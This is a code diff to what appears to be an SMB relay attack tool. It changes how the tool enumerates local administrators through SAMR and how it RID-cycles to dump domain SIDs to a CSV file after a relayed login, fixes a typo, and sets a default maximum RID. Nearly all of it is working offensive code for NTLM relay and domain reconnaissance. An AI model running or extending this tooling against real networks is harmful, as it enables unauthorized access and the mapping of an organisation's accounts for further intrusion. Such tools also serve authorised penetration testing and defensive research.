@@ -111,22 +111,26 @@ class SMBAttack(Thread):
                 remoteOps.enableRegistry()
             except Exception, e:
                 if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
-                    if self.config.enum_local_admins:
+                    if self.config.enumLocalAdmins:
                         logging.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
                         enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
                         localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
                         logging.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
                         for name in localAdminNames:
-                            logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemtoeHost(), name))
+                            logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
+                    
                     if self.config.ridCycle and not ridCycleDone:
                         logging.info("Relayed user doesn't have admin on {}. Performing RID cycling to enumerate domain users".format(self.__SMBConnection.getRemoteHost())) 
                         ridCycle = RidCycle(self.__SMBConnection)
-                        domainUsers = ridCycle.getDomainUsers(self.config.ridMax)
-                        logging.info("Performed RID cycle from host {}. Enumerated {} domain users".format(self.__SMBConnection.getRemoteHost(), len(domainUsers)))
-                        filename = "{}_ridUsers.txt".format(self.__SMBConnection.getServerDomain())
+                        domainSids = ridCycle.getDomainSIDs(self.config.ridMax)
+                        logging.info("Performed RID cycle from host {}. Enumerated {} domain SIDs".format(self.__SMBConnection.getRemoteHost(), len(domainSids)))
+                        filename = "{}_domainSids.csv".format(self.__SMBConnection.getRemoteHost())
                         with open(filename, 'w') as fp:
-                            fp.write(domainUsers)
+                            fp.write("SID, Name, Type\n")
+                            fp.write("\n".join(domainSids))
                         logging.info("{} written with results".format(filename))
+                        ridCycleDone = True
+
                     return
 
                 # Something else went wrong
@@ -483,7 +487,7 @@ if __name__ == '__main__':
                                                           'directory).')
     smboptions.add_argument('--enum-local-admins', action='store_true', required=False, help='If relayed user is not admin, attempd SAMR lookup to see who is')
     smboptions.add_argument('--rid-cycle', action='store_true', required=False, help='Perform a RID bruteforce to enumerate domain users after the first succesful relay. Default max RID=4000')
-    smboptions.add_argument('--rid-max', action='store', required=False, help='If --rid-cycle is specified, you can override the RID max here. Default: 4000')
+    smboptions.add_argument('--rid-max', action='store', required=False, default=4000, type=int, help='If --rid-cycle is specified, you can override the RID max here. Default: 4000')
 
     #MSSQL arguments
     mssqloptions = parser.add_argument_group("MSSQL client options")
